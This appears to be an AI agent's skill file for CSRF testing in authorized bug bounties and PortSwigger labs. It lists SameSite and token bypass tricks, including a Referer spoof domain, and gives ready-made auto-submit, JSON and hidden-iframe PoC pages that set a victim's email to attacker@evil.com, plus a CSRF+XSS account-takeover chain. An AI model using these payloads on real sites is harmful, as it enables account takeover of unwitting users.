---
name: csrf-methodology
description: "CSRF deep methodology for authorized security testing. Covers: SameSite bypass techniques (GET method override, 2-minute window, sibling domain XSS, WebSocket), CSRF token bypass (absent, wrong value, cross-user reuse, method switch, parameter removal, Referer bypass), PoC templates (form auto-submit, JSON CSRF via text/plain, silent iframe), CSRF+XSS chain for account takeover. High-tier bounty ceiling. 12 PortSwigger labs."
trigger_keywords: "csrf, cross-site request forgery, samesite bypass, csrf token bypass, csrf poc, csrf chain, samesite lax, samesite strict, csrf xss chain, json csrf, csrf iframe, csrf form, referer bypass, csrf double submit, csrf origin"
version: 1.0
created: 2026-02-25
owner: cyber-operator
---

# CSRF Deep Methodology (SameSite Bypass)

## Purpose

Force authenticated state-changing requests from a victim's browser. Modern SameSite defaults require bypass techniques. High bounty ceiling (account takeover when chained with XSS). 12 PortSwigger labs.

---

## SameSite Bypass Techniques

### Bypass 1 — GET Method Override

SameSite=Lax allows GET requests from cross-site navigation. If state-changing endpoints accept GET:

```html
<!-- Direct GET link -->
<a href="https://target.com/account/delete">Click here!</a>

<!-- Method override via parameter -->
<a href="https://target.com/settings?_method=POST&email=attacker@evil.com">Prize!</a>
```

Test: Change `POST /api/endpoint` to `GET /api/endpoint` with same parameters. Does it work?

### Bypass 2 — Two-Minute Window After Cookie Set

Chrome: cookies without explicit SameSite attribute are sent on cross-site POSTs for 2 minutes after the cookie is set.

```
Trigger: Force re-authentication (expire session, password change, OAuth re-login)
→ Within 2 minutes: cross-site POST succeeds
→ CSRF window open
```

### Bypass 3 — Sibling Domain XSS (Same eTLD+1)

SameSite definition: same eTLD+1 (e.g., both `evil.example.com` and `app.example.com` are "same site").

```
XSS on evil.example.com → can CSRF app.example.com
(SameSite attribute is irrelevant — requests come from same site)
```

### Bypass 4 — SameSite=None Targets

If cookie has `SameSite=None` (required for cross-site embedding):
```
Any cross-origin page can CSRF the target — SameSite provides zero protection
Standard PoC HTML page works directly
```

---

## CSRF Token Bypass Techniques

```
1. Remove token parameter entirely → server accepts request?
2. Change token to random string → server validates format only?
3. Send empty token value → server allows empty?
4. Cross-user token reuse → copy token from your account, use with victim session?
5. Method switch: POST requires token → switch to GET?
6. Content-Type switch: JSON bypass form-based token check?
7. Strip Referer header → <meta name="referrer" content="no-referrer">
8. Partial Referer match bypass → https://target.com.attacker.com
```

---

## PoC Templates

### Basic Form Auto-Submission

```html
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
</body>
</html>
```

### JSON Body CSRF (via text/plain Content-Type)

```html
<html>
<body>
<form action="https://target.com/api/update" method="POST"
      enctype="text/plain">
  <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}'>
  <!-- Sends body: {"email":"attacker@evil.com","x":"="} — valid JSON -->
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### Silent iframe (no popup, no user-visible action)

```html
<html>
<body>
  <iframe name="csrf-frame" style="display:none;"></iframe>
  <form action="https://target.com/account/email" method="POST" target="csrf-frame">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

---

## CSRF + XSS Chain → Account Takeover

```
1. Find CSRF vulnerability on /account/email-change
2. Find XSS on same target
3. XSS payload:
   - Reads the victim's CSRF token from the DOM
   - Submits the CSRF request with the real token
   - Changes victim's email to attacker@evil.com
4. Trigger password reset → full account takeover
```

---

## Evidence Standards

- Basic CSRF: Include PoC HTML page, steps to reproduce (host page, victim visits, action occurs), screenshot showing the change.
- SameSite bypass: Clearly explain which bypass technique applies (GET method, 2-min window, sibling XSS). Show the PoC adapted for the bypass.
- Token bypass: Show the original request with token, the modified request without, and that the action succeeds.

*csrf-methodology.md v1.0 | owner: cyber-operator | 2026-02-25*
